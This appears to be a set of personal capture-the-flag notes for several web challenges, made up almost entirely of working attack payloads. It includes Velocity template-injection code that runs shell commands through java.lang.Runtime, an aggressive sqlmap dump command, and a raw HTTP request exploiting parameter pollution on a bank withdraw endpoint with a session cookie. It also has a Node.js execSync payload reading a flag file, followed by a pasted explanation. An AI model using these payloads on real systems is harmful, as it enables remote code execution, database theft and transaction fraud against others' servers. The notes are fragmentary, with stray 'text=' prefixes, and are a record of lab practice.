text=#set($x='')



#set($rt=$x.class.forName('java.lang.Runtime'))



#set($chr=$x.class.forName('java.lang.Character'))



#set($str=$x.class.forName('java.lang.String'))



#set($ex=$rt.getRuntime().exec('cat ../flagf9e2d26040.txt'))



$ex.waitFor()



#set($out=$ex.getInputStream())



#foreach($i in [1..$out.available()])



    $str.valueOf($chr.toChars($out.read()))



#end

text=text=#set($str = "") #set($runtime = $str.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)) #set($listFilesCmd = "ls /") #set($process = $runtime.exec($listFilesCmd)) #set($scanner = $str.getClass().forName("java.util.Scanner").getConstructor($str.getClass().forName("java.io.InputStream")).newInstance($process.getInputStream())) #set($files = "") #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file


0xBOverchunked:
    create a text file with Transfer-Encoding: chunked
    take a repeater request and insert all to a text file,and add Transfer-Encoding: chunked
    sqlmap -r <Filename> --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10

HTBank:

    Exploiting Parameter Pollution Vulnerability
    POST /api/withdraw HTTP/1.1

Host: 83.136.254.223:30313

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://83.136.254.223:30313/home

Content-Type: multipart/form-data; boundary=---------------------------388085167429586914953899034002

Content-Length: 410

Origin: http://83.136.254.223:30313

Connection: close

Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZXhwIjoxNzExMjYxNzI4fQ.jIrlN5fOJGSfwCrdPc7HBsJ08idilF9QkWFI-eQrfGQ



-----------------------------388085167429586914953899034002

Content-Disposition: form-data; name="account"



test1

-----------------------------388085167429586914953899034002

Content-Disposition: form-data; name="amount"



0

-----------------------------388085167429586914953899034002

        Content-Disposition: form-data; name="amount"



        1337

        -----------------------------388085167429586914953899034002--

2 conditions for 1 parameter "amount"at the same time 

jscacl:
    require('child_process').execSync('cat /flag.txt').toString()
    The line of code you've provided is a Node.js script that uses the `execSync` function from the `child_process` module to execute a synchronous shell command and process its output. Here's what each part of the code does:

- `require('child_process')`: This imports the `child_process` module, which provides functionality to execute other applications or shell commands from within a Node.js script.

- `.execSync('cat /flag.txt')`: The `execSync` function is used to execute the specified shell command synchronously. In this case, it executes `cat /flag.txt`, which reads the content of the file named `/flag.txt`. Unlike the `exec` function, which is asynchronous, `execSync` blocks the Node.js event loop until the command completes execution. This means that no other operations can run in the script until this command finishes.

- `.toString()`: The `execSync` function returns a `Buffer` object containing the standard output of the executed command. Since a buffer represents binary data, calling `.toString()` on this buffer converts its content to a string, which is more human-readable and can be manipulated or displayed in the script.

So, the whole line `require('child_process').execSync('cat /flag.txt').toString()` synchronously executes the command `cat /flag.txt` and converts the output of this command into a string. The content of `/flag.txt` is then available in the script as this string. If the file `/flag.txt` contains text, this command would return that text as a string in the Node.js environment.

It's important to note that using `execSync` to execute shell commands that include input from untrusted sources can be dangerous, as it can lead to command injection vulnerabilities. Always validate and sanitize external inputs when using them in shell commands.

